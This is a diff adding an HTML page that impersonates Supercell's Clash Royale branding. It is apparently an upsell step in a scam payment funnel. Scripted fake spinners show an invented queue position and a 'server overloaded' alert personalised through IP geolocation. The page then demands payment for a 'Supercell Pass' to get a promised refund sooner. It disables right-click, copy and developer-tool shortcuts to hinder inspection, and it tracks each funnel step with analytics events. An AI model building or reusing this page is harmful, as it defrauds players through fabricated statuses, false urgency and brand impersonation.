@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="utm_xtrackytrack.js"></script>
+<script src="utmifytrack.js"></script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D7I47OBC77U6LKRKSTB0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+<script>
+
+document.addEventListener('contextmenu', function(e) {
+e.preventDefault();
+});
+
+// Impede combinações de teclas como Ctrl+U, Ctrl+C, Ctrl+V, F12, Ctrl+Shift+I
+document.addEventListener('keydown', function(e) {
+if (
+(e.ctrlKey && (e.key === 'u' || e.key === 'c' || e.key === 'v' || e.key === 's')) ||
+(e.key === 'F12') ||
+(e.ctrlKey && e.shiftKey && e.key === 'I') ||
+(e.ctrlKey && e.key === 'Shift' && e.key === 'I') ||
+(e.ctrlKey && e.key === 'J')
+) {
+e.preventDefault();
+}
+});
+</script>
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "wahzbczx2t");
+</script>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>Status</title>
+<meta name="theme-color" content="#0f377d"/>
+<link rel="icon" href="../favicon.ico"/>
+<script>
+window.onload = function () {
+  var links = document.getElementsByTagName("a");
+  for (var i = 0, n = links.length; i < n; i++) {
+    if (links[i].href.includes("#")) continue;
+    var href =
+      links[i].href.trim() +
+      (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+      document.location.search.replace("?", "").toString();
+    links[i].href = href;
+  }
+};
+</script>
+
+<link href="../_next/static/css/57dd0695866c7c8b.css" rel="stylesheet"/>
+<link href="../_external/cdn.supercell.com/fonts/supercell/fonts_supercellheadline.css" rel="stylesheet"/>
+<link href="../_external/cdn.supercell.com/fonts/supercell/fonts_supercelltext_full.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" rel="stylesheet"/>
+
+<style>
+  @font-face { font-family: 'Clash'; src: url('../_next/static/media/clash-regular.24a357c6.woff2') format('woff2'); font-weight: normal; font-display: swap; }
+  @font-face { font-family: 'Clash-Bold'; src: url('../_next/static/media/clash-heavy.0c306b59.woff2') format('woff2'); font-weight: bold; font-display: swap; }
+  @font-face { font-family: 'SupercellText-Regular'; src: url('../_external/cdn.supercell.com/fonts/supercell/supercelltext/full/supercelltext_w_rg.woff2') format('woff2'); font-display: swap; }
+  @font-face { font-family: 'SupercellText-Medium'; src: url('../_external/cdn.supercell.com/fonts/supercell/supercelltext/full/supercelltext_w_md.woff2') format('woff2'); font-display: swap; }
+  @font-face { font-family: 'SupercellHeadline-Bold'; src: url('../_external/cdn.supercell.com/fonts/supercell/supercellheadline/supercellheadline-bold.woff2') format('woff2'); font-display: swap; }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { overscroll-behavior: none; }
+  html { background: #fff !important; }
+  body {
+    font-family: SupercellText-Regular, -apple-system, arial, sans-serif;
+    background: #f5f5f5;
+    color: #222;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* === HEADER === */
+  .header_StickyHeader__afXYg { background: #0f377d; min-height: 56px; }
+  .header_header__aEre8 { background: #0f377d; }
+
+  /* === STATUS BAR === */
+  .up-status {
+    background: #f0fdf4;
+    border-bottom: 1px solid #dcfce7;
+    padding: 14px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .up-status-icon {
+    width: 24px; height: 24px; background: #22c55e; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  }
+  .up-status-icon svg { width: 13px; height: 13px; }
+  .up-status p { font-size: 13px; color: #166534; line-height: 1.4; }
+  .up-status b { color: #14532d; }
+
+  /* === CONTAINER === */
+  .up-container {
+    max-width: 440px;
+    margin: 0 auto;
+    padding: 20px 16px 32px;
+  }
+
+  /* === CARD === */
+  .up-card {
+    background: #fff;
+    border-radius: 16px;
+    overflow: hidden;
+    box-shadow: 0 2px 16px rgba(0,0,0,0.07);
+    margin-bottom: 16px;
+  }
+  .up-card-body { padding: 22px 20px; }
+  .up-card-title {
+    font-family: SupercellText-Medium, arial, sans-serif;
+    font-size: 18px; color: #111; margin-bottom: 6px; line-height: 1.3;
+  }
+  .up-card-desc {
+    font-size: 14px; color: #555; line-height: 1.7; margin-bottom: 12px;
+  }
+  .up-card-desc:last-child { margin-bottom: 0; }
+
+  /* === ORDER ROW === */
+  .up-order-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 16px 20px;
+    border-bottom: 1px solid #f0f0f0;
+  }
+  .up-order-icon {
+    width: 49px; height: 49px; border-radius: 50%; object-fit: cover;
+    flex-shrink: 0;
+  }
+  .up-order-info { text-align: right; flex: 1; }
+  .up-order-id {
+    font-family: SupercellText-Medium, arial, sans-serif;
+    font-size: 17px; color: #3b3b3b; font-weight: bold;
+  }
+  .up-order-date {
+    font-size: 12px; color: #888; margin-top: 2px;
+  }
+
+  /* === STATUS STEPS === */
+  .up-steps {
+    padding: 0 20px;
+    border-bottom: 1px solid #f0f0f0;
+  }
+  .up-steps-header {
+    background: #0f377d;
+    color: #fff;
+    font-family: SupercellText-Medium, arial, sans-serif;
+    font-size: 14px;
+    padding: 10px 16px;
+    border-radius: 10px 10px 0 0;
+    margin: 16px 0 0;
+    letter-spacing: 0.3px;
+  }
+  .up-step {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 0;
+    border-bottom: 1px solid #f5f5f5;
+  }
+  .up-step:last-child { border-bottom: none; }
+  .up-step-icon {
+    width: 36px; height: 36px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; color: #fff;
+  }
+  .up-step-icon.green { background: #22c55e; }
+  .up-step-icon.blue { background: #0f377d; }
+  .up-step-icon.red { background: #dc2626; }
+  .up-step-icon.white { background: #fff; border: 2px solid #0f377d; color: #0f377d; }
+  .up-step-title {
+    font-family: SupercellText-Medium, arial, sans-serif;
+    font-size: 14px; color: #333;
+  }
+  .up-step-time {
+    font-size: 12px; color: #999; margin-top: 2px;
+  }
+
+  /* === MESSAGE BLOCK === */
+  .up-message {
+    padding: 16px 20px;
+    font-size: 14px; color: #555; line-height: 1.7;
+    text-align: center;
+  }
+  .up-highlight {
+    color: #0f377d; font-weight: bold;
+  }
+
+  /* === BOTAO CTA === */
+  .up-cta {
+    display: flex; width: 100%; padding: 16px 20px;
+    background: #0f377d;
+    border: none; border-radius: 12px; color: #fff;
+    font-family: SupercellText-Medium, arial, sans-serif;
+    font-size: 16px; cursor: pointer; text-align: center;
+    text-decoration: none;
+    box-shadow: 0 4px 16px rgba(15,55,125,0.3);
+    transition: transform 0.15s, box-shadow 0.15s;
+    margin-bottom: 12px;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  .up-cta:active { transform: scale(0.98); box-shadow: 0 2px 8px rgba(15,55,125,0.2); }
+
+  /* === TRUST === */
+  .up-trust {
+    display: flex; align-items: center; justify-content: center;
+    gap: 6px; margin-top: 16px;
+    font-size: 11px; color: #bbb;
+  }
+  .up-trust svg { width: 14px; height: 14px; color: #ccc; }
+
+  /* === SPINNER === */
+  .up-spinner {
+    width: 30px; height: 30px;
+    border: 4px solid rgba(0,0,0,0.1);
+    border-radius: 50%;
+    border-left-color: #0f377d;
+    animation: up-spin 1s ease infinite;
+    margin: 0 auto;
+  }
+  @keyframes up-spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  .up-loading-text {
+    font-family: SupercellText-Regular, arial, sans-serif;
+    color: #888; font-size: 13px; text-align: center; margin-top: 10px;
+  }
+
+  /* === PROCESSING OVERLAY === */
+  .up-processing {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(255,255,255,0.95);
+    display: none; flex-direction: column;
+    justify-content: center; align-items: center;
+    z-index: 100;
+  }
+  .up-processing-spinner {
+    width: 50px; height: 50px;
+    border: 5px solid rgba(0,0,0,0.1);
+    border-radius: 50%;
+    border-top-color: #0f377d;
+    animation: up-spin 1s ease-in-out infinite;
+  }
+  .up-processing-text {
+    margin-top: 20px;
+    font-family: SupercellText-Medium, arial, sans-serif;
+    color: #0f377d; font-size: 16px;
+  }
+  .up-progress-container {
+    width: 200px; height: 6px;
+    background: #eaeaea; border-radius: 3px;
+    margin-top: 10px; overflow: hidden;
+  }
+  .up-progress-bar {
+    height: 100%; background: #0f377d;
+    animation: up-progress 5s linear forwards;
+  }
+  @keyframes up-progress {
+    0% { width: 0%; }
+    100% { width: 100%; }
+  }
+
+  /* === HIDDEN === */
+  .hidden { display: none !important; }
+
+  /* === PULSE === */
+  @keyframes up-pulse {
+    0% { transform: scale(0.98); box-shadow: 0 4px 16px rgba(15,55,125,0.3); }
+    50% { transform: scale(1.02); box-shadow: 0 8px 24px rgba(15,55,125,0.45); }
+    100% { transform: scale(0.98); box-shadow: 0 4px 16px rgba(15,55,125,0.3); }
+  }
+  .up-pulse { animation: up-pulse 1.5s infinite; }
+
+  /* === FADE IN === */
+  @keyframes up-fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .up-fade-in { animation: up-fadeIn 0.5s ease; }
+
+  /* === TYPING CURSOR === */
+  .up-typing::after {
+    content: '|';
+    animation: up-blink 1s infinite;
+  }
+  @keyframes up-blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  /* === ALERT CARD === */
+  .up-alert-card {
+    background: #0f377d;
+    border-radius: 12px;
+    padding: 16px;
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+    margin: 12px 0;
+  }
+  .up-alert-card .up-step-icon {
+    flex-shrink: 0;
+    width: 36px; height: 36px;
+  }
+  .up-alert-card p {
+    color: #fff;
+    font-size: 14px;
+    line-height: 1.6;
+  }
+
+  /* === WARNING CARD === */
+  .up-warning-card {
+    background: #fff;
+    border: 1px solid #f0f0f0;
+    border-radius: 12px;
+    padding: 16px;
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+    margin: 12px 0;
+  }
+  .up-warning-card p {
+    font-size: 14px; color: #333; line-height: 1.6;
+  }
+
+  /* === SHIMMER === */
+  .up-step-icon { position: relative; overflow: hidden; }
+  .up-step-icon::before {
+    content: '';
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(255,255,255,0.2);
+    transform: translateX(-100%) rotate(45deg);
+    animation: up-shimmer 2s infinite;
+  }
+  @keyframes up-shimmer {
+    0% { transform: translateX(-100%) rotate(45deg); }
+    100% { transform: translateX(100%) rotate(45deg); }
+  }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header_StickyHeader__afXYg header_clashroyale__V0ceA" style="pointer-events:auto;transform:none;">
+  <header class="header_header__aEre8 header_clashroyale__V0ceA">
+    <div class="header_headerBg__Kx6wd"></div>
+    <div class="header_content__4hEDm" style="display:flex;justify-content:center;">
+      <a class="header_logo__Rz_Om header_clashroyale__V0ceA" href="../index.html" tabindex="0" style="margin:0 auto;">
+        <img alt="clashroyale" data-nimg="fill" decoding="async" loading="eager" src="../_next/static/media/logo.e102c5d9.webp" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent"/>
+      </a>
+    </div>
+  </header>
+</div>
+
+<!-- CONTEUDO -->
+<div class="up-container">
+
+  <!-- ============================== -->
+  <!-- TELA 1: STATUS DO PEDIDO       -->
+  <!-- ============================== -->
+  <div id="ad1">
+
+    <!-- Card principal -->
+    <div class="up-card">
+
+      <!-- Linha do pedido -->
+      <div class="up-order-row">
+        <img class="up-order-icon" src="../_external/cdn.id.supercell.com/assets/web/portraits/0,king,1D1D1D,878787.png" alt="Rei do Clash">
+        <div class="up-order-info">
+          <div class="up-order-id" id="order-id">#6481749338</div>
+          <div class="up-order-date" id="up-order-date">Verificação realizada em --/--/----</div>
+        </div>
+      </div>
+
+      <!-- Status steps -->
+      <div class="up-steps">
+        <div class="up-steps-header">Status</div>
+        <div class="up-step">
+          <div class="up-step-icon green">
+            <span class="material-symbols-outlined" style="font-size:18px;">check</span>
+          </div>
+          <div>
+            <div class="up-step-title">Verificação Concluída</div>
+            <div class="up-step-time" id="up-time1">Hoje &agrave;s --:--</div>
+          </div>
+        </div>
+        <div class="up-step">
+          <div class="up-step-icon blue">
+            <span class="material-symbols-outlined" style="font-size:18px;">diamond</span>
+          </div>
+          <div>
+            <div class="up-step-title">Enviando itens!</div>
+            <div class="up-step-time" id="up-time2">Solicitado &agrave;s --:--</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Mensagem -->
+      <div class="up-message">
+        Sua verificação foi um sucesso!
+        <span class="up-highlight">(Seus 19,37 serão reembolsados)</span>
+        Clique no bot&atilde;o abaixo e confira
+        <span class="up-highlight">o recebimento dos seus itens!</span>
+      </div>
+    </div>
+
+    <!-- Botao conferir -->
+    <button class="up-cta up-pulse" onclick="showAd2()">
+      <span>Conferir Recebimento</span>
+      <span class="material-symbols-outlined" style="font-size:24px;">arrow_forward_ios</span>
+    </button>
+
+    <div class="up-trust">
+      <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+      <span>Conex&atilde;o segura e protegida</span>
+    </div>
+  </div>
+
+  <!-- ============================== -->
+  <!-- TELA PROCESSING                -->
+  <!-- ============================== -->
+  <div class="up-processing" id="processing-screen">
+    <div class="up-processing-spinner"></div>
+    <p class="up-processing-text">Verificando seus dados...</p>
+    <div class="up-progress-container">
+      <div class="up-progress-bar"></div>
+    </div>
+  </div>
+
+  <!-- ============================== -->
+  <!-- TELA 2: ATUALIZACAO DO PEDIDO  -->
+  <!-- ============================== -->
+  <div id="ad2" style="display:none;">
+
+    <div class="up-card" style="min-height:420px;">
+      <div class="up-card-body">
+
+        <h2 class="up-card-title" style="margin-bottom:16px;">Atualiza&ccedil;&atilde;o do Seu Pedido</h2>
+
+        <!-- Spinner 1 -->
+        <div id="loadingGif" style="text-align:center;margin:24px 0;">
+          <div class="up-spinner"></div>
+          <p class="up-loading-text">Calculando sua posi&ccedil;&atilde;o na fila...</p>
+        </div>
+
+        <!-- Mensagem 1: posicao na fila -->
+        <div id="text1" class="hidden up-warning-card up-fade-in">
+          <div class="up-step-icon green" style="margin-top:2px;">
+            <span class="material-symbols-outlined" style="font-size:18px;">settings</span>
+          </div>
+          <p class="up-typing">
+            Posi&ccedil;&atilde;o na fila para receber seu reembolso de R$19,37 e itens: 15864 de 16346 jogadores...
+          </p>
+        </div>
+
+        <!-- Spinner 2 -->
+        <div id="loadingGif2" class="hidden" style="text-align:center;margin:24px 0;">
+          <div class="up-spinner"></div>
+          <p class="up-loading-text">Verificando Servidores...</p>
+        </div>
+
+        <!-- Mensagem 2: aviso problema -->
+        <div id="text2" class="hidden up-warning-card up-fade-in">
+          <div class="up-step-icon red" style="margin-top:2px;">
+            <span class="material-symbols-outlined" style="font-size:18px;">warning</span>
+          </div>
+          <p>Nosso servidor respons&aacute;vel por <span id="regiao-dinamica" style="font-weight:bold;">sua regi&atilde;o</span> est&aacute; sobrecarregado devido &agrave; alta quantidade de pedidos!</p>
+        </div>
+
+        <!-- Spinner 3 -->
+        <div id="loadingGif3" class="hidden" style="text-align:center;margin:24px 0;">
+          <div class="up-spinner"></div>
+          <p class="up-loading-text">Calculando prefer&ecirc;ncia...</p>
+        </div>
+
+        <!-- Mensagem 3: alerta prioridade -->
+        <div id="text3" class="hidden up-alert-card up-fade-in">
+          <div class="up-step-icon white" style="margin-top:2px;">
+            <span class="material-symbols-outlined" style="font-size:18px;">priority_high</span>
+          </div>
+          <p>Seu reembolso e itens chegar&atilde;o em at&eacute; (14 dias &uacute;teis). Caso deseje prioridade na fila e receber tudo imediatamente, ser&aacute; necess&aacute;rio pagar pela Supercell Pass</p>
+        </div>
+
+        <!-- Botao final -->
+        <div id="finalButton" class="hidden" style="margin-top:20px;">
+          <button class="up-cta up-pulse" onclick="if(window.clarity) window.clarity('event','iniciou_checkout2'); window.location.href='checkout2.html'">
+            <span>Supercell Pass</span>
+            <span class="material-symbols-outlined" style="font-size:24px;">arrow_forward_ios</span>
+          </button>
+          <div class="up-trust" style="margin-top:10px;">
+            <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+            <span>Receba Seu Reembolso e os Itens Agora!</span>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<!-- SCRIPTS -->
+<script>
+/* Mostrar tela 2 com transicao de processamento */
+function showAd2() {
+  var ad1 = document.getElementById('ad1');
+  var ad2 = document.getElementById('ad2');
+  var proc = document.getElementById('processing-screen');
+
+  ad1.style.display = 'none';
+  proc.style.display = 'flex';
+
+  setTimeout(function(){
+    proc.style.display = 'none';
+    ad2.style.display = 'block';
+    runSequence();
+  }, 5000);
+}
+
+/* Sequencia de revelacao da tela 2 */
+function runSequence() {
+  var loadingGif  = document.getElementById('loadingGif');
+  var text1       = document.getElementById('text1');
+  var loadingGif2 = document.getElementById('loadingGif2');
+  var text2       = document.getElementById('text2');
+  var loadingGif3 = document.getElementById('loadingGif3');
+  var text3       = document.getElementById('text3');
+  var finalButton = document.getElementById('finalButton');
+
+  /* Passo 1: spinner ja visivel, apos 3s mostra text1 */
+  setTimeout(function(){
+    loadingGif.style.display = 'none';
+    text1.classList.remove('hidden');
+
+    /* Passo 2: spinner 2 */
+    setTimeout(function(){
+      loadingGif2.classList.remove('hidden');
+
+      setTimeout(function(){
+        loadingGif2.classList.add('hidden');
+        text2.classList.remove('hidden');
+
+        /* Passo 3: spinner 3 */
+        setTimeout(function(){
+          loadingGif3.classList.remove('hidden');
+
+          setTimeout(function(){
+            loadingGif3.classList.add('hidden');
+            text3.classList.remove('hidden');
+
+            /* Botao final */
+            setTimeout(function(){
+              finalButton.classList.remove('hidden');
+            }, 800);
+          }, 3000);
+        }, 1500);
+      }, 3000);
+    }, 1500);
+  }, 3000);
+}
+
+/* Geolocalização */
+async function fetchLocation() {
+  try {
+    var res = await fetch('https://get.geojs.io/v1/ip/geo.json');
+    var data = await res.json();
+    var regiaoEl = document.getElementById("regiao-dinamica");
+    if (regiaoEl && data.region) regiaoEl.innerText = data.region;
+  } catch (e) {
+    console.warn("Erro ao buscar localização", e);
+  }
+}
+window.addEventListener("load", fetchLocation);
+
+/* Horários dinâmicos */
+(function(){
+  var now = new Date();
+
+  /* "Verificação Concluída" = hora que pagou o up1 */
+  var pagoEm = sessionStorage.getItem('up1_pago_em');
+  var pagDate = pagoEm ? new Date(Number(pagoEm)) : new Date(now.getTime() - 2*60000);
+  var h1 = String(pagDate.getHours()).padStart(2,'0');
+  var m1 = String(pagDate.getMinutes()).padStart(2,'0');
+  var t1 = document.getElementById('up-time1');
+  if(t1) t1.textContent = 'Hoje às ' + h1 + ':' + m1;
+
+  /* "Enviando itens" = hora que entrou no up2 (agora) */
+  var h2 = String(now.getHours()).padStart(2,'0');
+  var m2 = String(now.getMinutes()).padStart(2,'0');
+  var t2 = document.getElementById('up-time2');
+  if(t2) t2.textContent = 'Solicitado às ' + h2 + ':' + m2;
+})();
+
+/* Data de hoje no pedido */
+(function(){
+  var d = new Date();
+  var dd = String(d.getDate()).padStart(2,'0');
+  var mm = String(d.getMonth()+1).padStart(2,'0');
+  var yyyy = d.getFullYear();
+  var el = document.getElementById('up-order-date');
+  if(el) el.textContent = 'Verificação realizada em ' + dd + '/' + mm + '/' + yyyy;
+})();
+</script>
+<script>
+document.addEventListener('DOMContentLoaded', function(){
+  if(window.clarity) window.clarity('event','etapa_ups2');
+});
+(function(){
+  var _orig = window.showAd2;
+  window.showAd2 = function(){
+    if(window.clarity) window.clarity('event','clicou_cta_ups2');
+    _orig.apply(this, arguments);
+  };
+})();
+</script>
+
+</body>
+</html>
